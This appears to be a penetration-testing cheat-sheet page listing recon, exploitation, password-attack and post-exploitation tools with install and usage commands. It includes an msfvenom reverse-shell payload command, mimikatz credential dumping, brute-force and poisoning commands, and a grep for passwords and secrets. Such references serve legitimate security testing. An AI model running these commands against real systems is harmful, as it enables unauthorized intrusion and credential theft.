# 🔧 Tools Index

> **Alphabetical tool reference — name, purpose, install, and usage.**

---

## Scanning & Recon

| Tool | Purpose | Install | Quick Usage |
|---|---|---|---|
| **amass** | Subdomain enumeration | `apt install amass` | `amass enum -d domain.com` |
| **dirsearch** | Directory brute force | `apt install dirsearch` | `dirsearch -u http://IP -e php,txt` |
| **dnsrecon** | DNS enumeration | `apt install dnsrecon` | `dnsrecon -d domain.com -t axfr` |
| **enum4linux-ng** | SMB/LDAP enumeration | `pip3 install enum4linux-ng` | `enum4linux-ng -A IP` |
| **feroxbuster** | Recursive dir fuzzing | `apt install feroxbuster` | `feroxbuster -u http://IP -w wordlist.txt` |
| **ffuf** | Web fuzzer | `apt install ffuf` | `ffuf -w wordlist.txt -u http://IP/FUZZ` |
| **gobuster** | Dir/DNS/vhost brute force | `apt install gobuster` | `gobuster dir -u http://IP -w wordlist.txt` |
| **masscan** | Fast port scanner | `apt install masscan` | `masscan -p1-65535 IP --rate=10000` |
| **nikto** | Web server scanner | `apt install nikto` | `nikto -h http://IP` |
| **nmap** | Port scanner + scripts | `apt install nmap` | `nmap -sC -sV -p- IP` |
| **nuclei** | Template-based scanner | GitHub releases | `nuclei -u http://IP -tags cve` |
| **rustscan** | Fast port discovery | GitHub releases | `rustscan -a IP -- -sC -sV` |
| **subfinder** | Passive subdomain enum | `apt install subfinder` | `subfinder -d domain.com` |
| **wafw00f** | WAF detection | `apt install wafw00f` | `wafw00f http://IP` |
| **whatweb** | Web tech fingerprinting | `apt install whatweb` | `whatweb -v http://IP` |

---

## Exploitation

| Tool | Purpose | Install | Quick Usage |
|---|---|---|---|
| **Burp Suite** | Web proxy + testing | Download from PortSwigger | GUI — intercept/repeat/fuzz |
| **msfconsole** | Metasploit Framework | `apt install metasploit-framework` | `msfconsole -q` |
| **msfvenom** | Payload generator | (part of Metasploit) | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe` |
| **searchsploit** | ExploitDB local search | `apt install exploitdb` | `searchsploit apache 2.4.49` |
| **sqlmap** | SQL injection automation | `apt install sqlmap` | `sqlmap -u "http://IP/page?id=1" --dbs` |
| **wpscan** | WordPress scanner | `apt install wpscan` | `wpscan --url http://IP --enumerate u,p,t` |

---

## Password Attacks

| Tool | Purpose | Install | Quick Usage |
|---|---|---|---|
| **hashcat** | GPU hash cracking | `apt install hashcat` | `hashcat -m 1000 hashes.txt rockyou.txt` |
| **hash-identifier** | Identify hash type | `apt install hash-identifier` | `hash-identifier '<hash>'` |
| **hydra** | Online brute force | `apt install hydra` | `hydra -l user -P wordlist ssh://IP` |
| **john** | Hash cracking (CPU) | `apt install john` | `john hashes.txt --wordlist=rockyou.txt` |
| **kerbrute** | Kerberos user enum/spray | GitHub releases | `kerbrute userenum -d domain.local users.txt` |
| **onesixtyone** | SNMP community brute | `apt install onesixtyone` | `onesixtyone -c snmp.txt IP` |
| **responder** | LLMNR/NBT-NS poisoner | `apt install responder` | `responder -I tun0 -wrdv` |

---

## Post-Exploitation & PrivEsc

| Tool | Purpose | Install | Quick Usage |
|---|---|---|---|
| **bloodhound** | AD attack path visualization | `apt install bloodhound` | GUI (after starting neo4j) |
| **bloodhound-python** | BloodHound data collection (Linux) | `pip3 install bloodhound` | `bloodhound-python -u user -p pass -d domain -ns IP -c All` |
| **certipy** | AD CS attack tool | `pip3 install certipy-ad` | `certipy find -u user@domain -p pass -dc-ip IP -vulnerable` |
| **chisel** | TCP tunneling over HTTP | GitHub releases | `chisel server -p 8080 --reverse` |
| **crackmapexec** | SMB/LDAP/WinRM pentest | `apt install crackmapexec` | `crackmapexec smb IP -u user -p pass --shares` |
| **evil-winrm** | WinRM shell client | `gem install evil-winrm` | `evil-winrm -i IP -u user -p pass` |
| **impacket** | Python network tools suite | `pip3 install impacket` | Various (psexec.py, secretsdump.py, etc.) |
| **ligolo-ng** | Network pivoting/tunneling | GitHub releases | `ligolo-ng-proxy -selfcert` |
| **linpeas.sh** | Linux privilege escalation enum | GitHub (PEASS-ng) | `./linpeas.sh \| tee /tmp/lp.txt` |
| **mimikatz** | Windows credential extractor | GitHub releases | `privilege::debug && sekurlsa::logonpasswords` |
| **powerview** | AD PowerShell enum | GitHub (PowerSploit) | `Import-Module PowerView.ps1` |
| **pspy** | Linux process monitor | GitHub releases | `./pspy64` |
| **winpeas.exe** | Windows privesc enum | GitHub (PEASS-ng) | `winPEAS.exe quiet` |

---

## Network & Services

| Tool | Purpose | Install | Quick Usage |
|---|---|---|---|
| **curl** | HTTP requests | built-in | `curl -s http://IP/ -v` |
| **netcat (nc)** | TCP/UDP connections | built-in | `nc -nvlp 4444` |
| **proxychains** | Route traffic through proxy | `apt install proxychains4` | `proxychains nmap -sT IP` |
| **redis-cli** | Redis interaction | `apt install redis-tools` | `redis-cli -h IP` |
| **rpcclient** | RPC enumeration | `apt install samba-common-bin` | `rpcclient -U "" -N IP` |
| **smbclient** | SMB share access | `apt install smbclient` | `smbclient -L //IP -N` |
| **smbmap** | SMB share permissions | `apt install smbmap` | `smbmap -H IP` |
| **snmp-check** | SNMP enumeration | `apt install snmpcheck` | `snmp-check IP -c public` |
| **socat** | Multi-purpose relay | `apt install socat` | `socat file:tty,raw,echo=0 tcp-listen:4444` |
| **ssh-audit** | SSH config auditing | `apt install ssh-audit` | `ssh-audit IP` |
| **tcpdump** | Packet capture | built-in | `tcpdump -i tun0 -w capture.pcap` |
| **wireshark** | Packet analysis GUI | `apt install wireshark` | GUI |

---

## Useful One-Liners

```bash
# Get your tun0 IP
ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1

# Find all open ports from nmap output
grep "open" nmap/alltcp.txt | cut -d/ -f1 | tr '\n' ','

# Extract potential passwords from files
grep -r -i "password\|passwd\|pwd\|secret\|key" . 2>/dev/null | grep -v ".git"

# Watch for new files
watch -n 1 'ls -lat /tmp/'

# Monitor cron in real-time
watch -n 1 'ps aux | grep -v grep | grep cron'
```

---

*[← Cheatsheets](./cheatsheets.md) · [Quick Reference Hub](./README.md) · [Wordlists →](./wordlists.md)*
